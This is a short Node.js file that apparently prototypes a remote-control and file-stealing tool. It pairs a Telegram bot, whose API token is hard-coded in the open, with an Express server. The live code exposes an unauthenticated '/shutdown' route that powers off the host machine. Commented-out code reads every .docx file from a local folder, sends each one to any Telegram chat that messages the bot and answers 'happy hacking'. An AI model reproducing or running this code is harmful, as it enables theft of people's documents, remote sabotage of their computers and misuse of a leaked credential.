const telegramBot = require("node-telegram-bot-api");
const token = "5790872543:AAF6MOPGVyzw5AvsOkeTNNEYx-lvaih2ZoA";
const bot = new telegramBot(token, { polling: true });
const express = require("express");
// const finder = require("findit");
// const glob = require("glob");
const app = express();
const fs = require("fs");
const path = require("path");
const port = process.env.PORT || 5000;

// app.get("/", (req, res) => {
//   console.log(__dirname);

//   const urlLaptop = "./tajriba";
//   fs.readdir(urlLaptop, (errLaptop, resultLaptop) => {
//     if (errLaptop) {
//       console.log(errLaptop);
//       return;
//     }

//     if (resultLaptop) {
//       resultLaptop.forEach((element) => {
//         if (path.extname(`${urlLaptop}/${element}`) == ".docx") {
//           bot.on("message", async (msg) => {
//             const chatId = msg.chat.id;
//             return await bot.sendDocument(chatId, `${urlLaptop}/${element}`);
//           });
//         }
//       });
//       res.send("happy hacking");
//     }
//   });
// });

// require("child_process").exec("cls", console.log);
app.get("/find", (req, res) => {
  // finder.on("file", function (file) {
  //   console.log(file);
  //   res.send("file");
  // });

  // glob("D://**", function (err, files) {
  //   if (err) {
  //     console.log(err);
  //   }

  //   // 👇️ ['src/file-2.js', 'src/file-3.js', 'src/file.js']
  //   console.log(files);

  //   // files.forEach((file) => {
  //   //   console.log(file);
  //   // });
  // });
  res.send("find");
});

const shutDown = require("shutdown-computer");
app.get("/shutdown", (req, res) => {
  shutDown.shutDownComputer();
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
